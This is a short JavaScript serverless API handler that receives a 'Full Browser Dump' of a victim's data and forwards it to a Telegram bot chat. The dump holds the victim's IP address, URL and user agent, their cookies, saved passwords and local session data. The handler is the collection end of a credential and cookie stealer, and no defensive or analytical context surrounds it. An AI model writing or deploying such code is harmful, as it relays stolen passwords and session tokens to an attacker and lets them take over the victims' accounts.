export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const data = req.body;
    
    const message = `
🔓 *Full Browser Dump*
🆔 IP: \`${data.ip}\`
🌐 URL: ${data.windowLocation}
🖥️ UA: ${data.userAgent.substring(0, 50)}...
💻 Platform: ${data.platform}
🍪 Cookies: \`${data.cookies || "N/A"}\`
🔑 Saved Passwords: ${JSON.stringify(data.savedPasswords).substring(0, 100)}...
💾 Local Session: \`${data.localSession || "N/A"}\`
📄 Title: ${data.title || "N/A"}
    `.trim();

    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: tgChatId, 
          text: message, 
          parse_mode: 'Markdown' 
        })
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
